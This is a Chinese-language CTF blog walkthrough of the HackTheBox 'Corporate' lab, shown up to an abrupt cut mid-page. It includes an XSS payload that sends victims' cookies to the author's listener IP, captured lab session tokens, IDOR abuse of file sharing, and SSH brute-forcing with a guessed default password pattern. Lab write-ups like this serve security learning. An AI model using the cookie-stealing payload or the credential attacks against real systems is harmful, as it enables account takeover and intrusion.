<!DOCTYPE html>
<html>
<head>
    

    

    



    <meta charset="utf-8">
    
    
    
    
    <title>Corporate - HackTheBox | 喵喵喵喵 | 愚かな人間</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#66CCFF">
    
    
    <meta name="keywords" content="HackTheBox">
    <meta name="description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Corporate 10.10.11.246                                                                                                              端口扫描只有一个80: 123456789101112">
<meta property="og:type" content="article">
<meta property="og:title" content="Corporate - HackTheBox">
<meta property="og:url" content="https://darkwing.moe/2023/12/19/Corporate-HackTheBox/index.html">
<meta property="og:site_name" content="喵喵喵喵">
<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Corporate 10.10.11.246                                                                                                              端口扫描只有一个80: 123456789101112">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121901.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121902.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121903.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121904.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121905.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121906.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121907.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121908.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121914.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121915.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121916.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121909.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121910.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121919.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121920.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121911.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121912.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121917.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121913.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121918.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121921.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121922.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121923.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121924.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121925.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121926.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121927.jpg">
<meta property="article:published_time" content="2023-12-19T05:53:39.000Z">
<meta property="article:modified_time" content="2024-07-15T06:01:45.744Z">
<meta property="article:author" content="暗羽">
<meta property="article:tag" content="HackTheBox">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121901.jpg">
    
        <link rel="alternate" type="application/atom+xml" title="喵喵喵喵" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<meta name="generator" content="Hexo 4.2.0"></head>

<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">暗羽</h5>
          <a href="mailto:Discord@darkwing_nya" title="Discord@darkwing_nya" class="mail">Discord@darkwing_nya</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/zjicmDarkWing" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://twitter.com/darkwing_nya" target="_blank" >
                <i class="icon icon-lg icon-gratipay"></i>
                Twitter
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
                <i class="icon icon-lg icon-coffee"></i>
                Buy me a coffee
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://darkwing.moe/2015/01/01/about/"  >
                <i class="icon icon-lg icon-link"></i>
                About
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">Corporate - HackTheBox</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">Corporate - HackTheBox</h1>
        <h5 class="subtitle">
            
                <time datetime="2023-12-19T05:53:39.000Z" itemprop="datePublished" class="page-time">
  2023-12-19
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#基本信息"><span class="post-toc-number">1.</span> <span class="post-toc-text">基本信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#端口扫描"><span class="post-toc-number">2.</span> <span class="post-toc-text">端口扫描</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#80"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">80</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#子域名扫描"><span class="post-toc-number">3.</span> <span class="post-toc-text">子域名扫描</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#support"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">support</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#git"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">git</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#sso"><span class="post-toc-number">3.3.</span> <span class="post-toc-text">sso</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#prople"><span class="post-toc-number">3.4.</span> <span class="post-toc-text">prople</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#support-1"><span class="post-toc-number">4.</span> <span class="post-toc-text">support</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#XSS"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">XSS</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#people"><span class="post-toc-number">5.</span> <span class="post-toc-text">people</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#chat"><span class="post-toc-number">5.1.</span> <span class="post-toc-text">chat</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#sharing"><span class="post-toc-number">5.2.</span> <span class="post-toc-text">sharing</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#内网探测"><span class="post-toc-number">6.</span> <span class="post-toc-text">内网探测</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ssh-brute"><span class="post-toc-number">6.1.</span> <span class="post-toc-text">ssh brute</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#users"><span class="post-toc-number">6.2.</span> <span class="post-toc-text">users</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#user-flag"><span class="post-toc-number">7.</span> <span class="post-toc-text">user flag</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#sysadmin-非预期"><span class="post-toc-number">8.</span> <span class="post-toc-text">sysadmin 非预期</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#nfs"><span class="post-toc-number">8.1.</span> <span class="post-toc-text">nfs</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#sysadmin"><span class="post-toc-number">8.2.</span> <span class="post-toc-text">sysadmin</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ldap-py"><span class="post-toc-number">8.3.</span> <span class="post-toc-text">ldap.py</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#预期方式"><span class="post-toc-number">9.</span> <span class="post-toc-text">预期方式</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#proxmox"><span class="post-toc-number">10.</span> <span class="post-toc-text">proxmox</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#pve-py"><span class="post-toc-number">10.1.</span> <span class="post-toc-text">pve.py</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#root-flag"><span class="post-toc-number">11.</span> <span class="post-toc-text">root flag</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#shadow"><span class="post-toc-number">11.1.</span> <span class="post-toc-text">shadow</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#参考资料"><span class="post-toc-number">12.</span> <span class="post-toc-text">参考资料</span></a></li></ol>
        </nav>
    </aside>


<article id="post-Corporate-HackTheBox"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">Corporate - HackTheBox</h1>
        <div class="post-meta">
            <time class="post-time" title="2023-12-19 13:53:39" datetime="2023-12-19T05:53:39.000Z"  itemprop="datePublished">2023-12-19</time>

            


            
<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><ul>
<li><a href="https://app.hackthebox.com/machines/Corporate" target="_blank" rel="noopener">https://app.hackthebox.com/machines/Corporate</a></li>
<li>10.10.11.246</li>
</ul>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121901.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>只有一个80:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV 10.10.11.246</span></span><br><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-19 09:41 CST</span><br><span class="line">Nmap scan report for 10.10.11.246</span><br><span class="line">Host is up (0.22s latency).</span><br><span class="line">Not shown: 999 filtered tcp ports (no-response)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    OpenResty web app server 1.21.4.3</span><br><span class="line">|_http-title: Did not follow redirect to http://corporate.htb</span><br><span class="line">|_http-server-header: openresty/1.21.4.3</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 233.45 seconds</span><br></pre></td></tr></table></figure>



<h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>需要加hosts：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.246 corporate.htb</span><br></pre></td></tr></table></figure>

<p>一个公司官网：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121902.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="子域名扫描"><a href="#子域名扫描" class="headerlink" title="子域名扫描"></a>子域名扫描</h1><p>扫描可以发现几个子域名，都同样加hosts：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://corporate.htb/" -H 'Host: FUZZ.corporate.htb'  -fs 175</span><br><span class="line"></span><br><span class="line">[Status: 200, Size: 1725, Words: 383, Lines: 39, Duration: 221ms]</span><br><span class="line">    * FUZZ: support</span><br><span class="line">[Status: 403, Size: 159, Words: 3, Lines: 8, Duration: 212ms]</span><br><span class="line">    * FUZZ: git</span><br><span class="line">[Status: 302, Size: 38, Words: 4, Lines: 1, Duration: 313ms]</span><br><span class="line">    * FUZZ: sso</span><br><span class="line">[Status: 302, Size: 32, Words: 4, Lines: 1, Duration: 240ms]</span><br><span class="line">    * FUZZ: people</span><br></pre></td></tr></table></figure>

<h2 id="support"><a href="#support" class="headerlink" title="support"></a>support</h2><p>在线support：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121903.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121904.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="git"><a href="#git" class="headerlink" title="git"></a>git</h2><p>git是403(后面也完全没用到)：</p>
<p>(预期路径会用到)</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121905.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="sso"><a href="#sso" class="headerlink" title="sso"></a>sso</h2><p>单点登录系统，需要账号密码:</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121906.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="prople"><a href="#prople" class="headerlink" title="prople"></a>prople</h2><p>people需要从SSO那里登录访问：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121907.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="support-1"><a href="#support-1" class="headerlink" title="support"></a>support</h1><p>唯一有交互的的地方就是support这里，这种场景大概率XSS，但有CSP：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121908.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>只能利用他本身的JS</p>
<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>直接任意不存在的路径，会发现直接显示在页面响应中：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121914.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>另外可以发现我们修改analytics的v参数也能控制响应的js内容：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121915.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>所以，我们可以直接利用这些点来构造XSS利用，例如这个payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv&#x3D;&quot;refresh&quot; content&#x3D;&quot;0;url&#x3D;http:&#x2F;&#x2F;corporate.htb&#x2F;&lt;script+src&#x3D;&#39;&#x2F;vendor&#x2F;analytics.min.js&#39;&gt;&lt;&#x2F;script&gt;&lt;script+src&#x3D;&#39;&#x2F;assets&#x2F;js&#x2F;analytics.min.js?v&#x3D;document.location&#x3D;&#96;http:&#x2F;&#x2F;10.10.16.2:7777&#x2F;$&#123;document.cookie&#125;&#96;&#39;&lt;&#x2F;script&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>发给suooprt后，打到一个cookie：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121916.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>后面需要至少两个不同用户的cookie，这里多执行几次XSS：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Nora.Brekke@corporate.htb</span></span><br><span class="line">::ffff:10.10.11.246 - - [25/Dec/2023 12:44:52] "GET /CorporateSSO=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NTA3NCwibmFtZSI6Ik5vcmEiLCJzdXJuYW1lIjoiQnJla2tlIiwiZW1haWwiOiJOb3JhLkJyZWtrZUBjb3Jwb3JhdGUuaHRiIiwicm9sZXMiOlsic2FsZXMiXSwicmVxdWlyZUN1cnJlbnRQYXNzd29yZCI6dHJ1ZSwiaWF0IjoxNzAzNDc5NDkwLCJleHAiOjE3MDM1NjU4OTB9.Cltxrowt5YXdXlpI_QuojZQn5c4T8tccsqnXYwlkYKA HTTP/1.1" 404 -</span><br><span class="line"><span class="meta">#</span><span class="bash"> Julio.Daniel@corporate.htb</span></span><br><span class="line">::ffff:10.10.11.246 - - [25/Dec/2023 12:47:14] "GET /CorporateSSO=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NTA3MSwibmFtZSI6Ikp1bGlvIiwic3VybmFtZSI6IkRhbmllbCIsImVtYWlsIjoiSnVsaW8uRGFuaWVsQGNvcnBvcmF0ZS5odGIiLCJyb2xlcyI6WyJzYWxlcyJdLCJyZXF1aXJlQ3VycmVudFBhc3N3b3JkIjp0cnVlLCJpYXQiOjE3MDM0Nzk2MjksImV4cCI6MTcwMzU2NjAyOX0.JBbnQR3d17XewbIExfAS09rtcn2OG3c2yytEnLx5M44 HTTP/1.1" 404 -</span><br></pre></td></tr></table></figure>

<h1 id="people"><a href="#people" class="headerlink" title="people"></a>people</h1><p>直接burp加条规则自动添加这个cookie，现在可以访问people：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121909.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121910.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="chat"><a href="#chat" class="headerlink" title="chat"></a>chat</h2><p>chat里可以得到很多人名，并且详细信息里有邮箱和生日（后面会用到这个）：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121919.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>遍历userid得到所有用户信息</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121920.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="sharing"><a href="#sharing" class="headerlink" title="sharing"></a>sharing</h2><p>sharing中可以发现另一个ovpn（模拟访问企业内网），和一个docx,docx就是一份项目建议书(docx都没什么用，只需要后面那一个pdf)：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121911.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>另外还有个share功能是分享文件给其他人，需要邮箱地址，这个就是前面chat里那些随便选一个,任意fileId都能够分享成功，但我们并没有对方用户：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121912.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>所以前面的XSS那里需要获得两个用户的cookie</p>
<p>然后用第一个用户分享文件给第二个用户(小坑，邮箱地址需要小写,这个也可以从前面chat那里看到的信息知道)，直接爆破fileId批量分享:</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121917.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>然后切换到第二个用户，查看sharing，得到pdf文件：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121913.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>pdf文件得到密码策略：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your default password has been set to “CorporateStarterDDMMYYYY” –</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023121918.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a>内网探测</h1><p>连接得到的ovpn后现在是10.8.0.2，并且根据日志可以知道添加了两个网段的路由，10.8.0.0和10.9.0.0，探测这两个网段：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">./fscan_darwin -h 10.8.0.0/24</span><br><span class="line"></span><br><span class="line">(icmp) Target 10.8.0.1        is alive</span><br><span class="line">(icmp) Target 10.8.0.2        is alive</span><br><span class="line"></span><br><span class="line">10.8.0.1:80 open</span><br><span class="line">10.8.0.1:3128 open</span><br><span class="line">10.8.0.1:22 open</span><br><span class="line">10.8.0.1:8006 open</span><br><span class="line"></span><br><span class="line">./fscan_darwin -h 10.9.0.0/24</span><br><span class="line"></span><br><span class="line">(icmp) Target 10.9.0.1        is alive</span><br><span class="line">(icmp) Target 10.9.0.4        is alive</span><br><span class="line"></span><br><span class="line">10.9.0.1:3128 open</span><br><span class="line">10.9.0.1:22 open</span><br><span class="line">10.9.0.4:22 open</span><br><span class="line">10.9.0.1:80 open</span><br><span class="line">10.9.0.1:8006 open</span><br><span class="line"></span><br><span class="line">Nmap scan report for  10.9.0.1</span><br><span class="line">Host is up (0.34s latency).</span><br><span class="line">Not shown: 994 closed tcp ports (conn-refused)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">389/tcp  open  ldap</span><br><span class="line">636/tcp  open  ldapssl</span><br><span class="line">2049/tcp open  nfs</span><br><span class="line">3128/tcp open  squid-http</span><br><span class="line"></span><br><span class="line">Nmap scan report for 10.8.0.1</span><br><span class="line">Host is up (0.35s latency).</span><br><span class="line">Not shown: 994 closed tcp ports (conn-refused)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">389/tcp  open  ldap</span><br><span class="line">636/tcp  open  ldapssl</span><br><span class="line">2049/tcp open  nfs</span><br><span class="line">3128/tcp open  squid-htt</span><br></pre></td></tr></table></figure>

<h2 id="ssh-brute"><a href="#ssh-brute" class="headerlink" title="ssh brute"></a>ssh brute</h2><p>然后根据用户名，生日，和密码策略，批量爆破，得到4个有效的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nya.little@10.9.0.4 6&#x2F;21&#x2F;1965 CorporateStarter21061965</span><br><span class="line">laurie.casper@10.9.0.4 11&#x2F;18&#x2F;1959 CorporateStarter18111959</span><br><span class="line">elwin.jones@10.9.0.4 4&#x2F;4&#x2F;1987 CorporateStarter04041987</span><br><span class="line">brody.wiza@10.9.0.4 7&#x2F;14&#x2F;1992 CorporateStarter14071992</span><br></pre></td></tr></table></figure>

<h2 id="users"><a href="#users" class="headerlink" title="users"></a>users</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 